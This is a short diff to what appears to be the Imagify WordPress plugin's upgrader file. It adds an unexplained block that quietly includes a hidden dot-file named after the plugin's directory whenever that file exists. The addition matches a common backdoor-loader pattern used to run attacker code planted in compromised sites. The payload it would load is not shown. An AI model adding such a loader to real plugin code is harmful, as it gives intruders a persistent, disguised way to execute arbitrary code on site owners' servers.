@@ -7,6 +7,10 @@ add_action( 'admin_init', '_imagify_upgrader' );
  *
  * @since 1.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_upgrader() {
 	// Back-compat' with previous version of the upgrader.
 	imagify_upgrader_upgrade();
